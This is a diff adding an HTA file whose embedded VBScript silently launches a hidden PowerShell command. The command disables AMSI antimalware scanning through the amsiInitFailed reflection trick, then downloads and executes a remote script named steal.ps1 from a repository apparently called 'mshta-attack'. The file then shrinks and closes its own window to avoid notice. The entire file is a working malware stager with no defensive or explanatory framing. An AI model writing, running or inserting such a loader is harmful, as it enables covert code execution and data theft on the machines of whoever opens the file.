@@ -1,0 +1,34 @@
+<html>
+<head>
+  <HTA:APPLICATION
+    ID="SilentApp"
+    SHOWINTASKBAR="no"
+    WINDOWSTATE="minimize"
+    CAPTION="no"
+    SYSMENU="no"
+    BORDER="none"/>
+  <script language="VBScript">
+    ' Configurable remote PowerShell script URL
+    Dim remoteUrl
+    remoteUrl = "https://raw.githubusercontent.com/someoneee0/mshta-attack/main/steal.ps1"
+
+    ' Build PowerShell command with explicit flags
+    Dim cmd
+    cmd = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+          """ & _
+          "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" & _
+          ".GetField('amsiInitFailed','NonPublic,Static')" & _
+          ".SetValue($null,$true); IEX (New-Object Net.WebClient)" & _
+          ".DownloadString('" & remoteUrl & "')" & _
+          """"
+
+    ' Execute silently
+    CreateObject("WScript.Shell").Run cmd, 0, False
+
+    ' Close HTA window immediately
+    window.resizeTo 0,0
+    window.close
+  </script>
+</head>
+<body></body>
+</html>
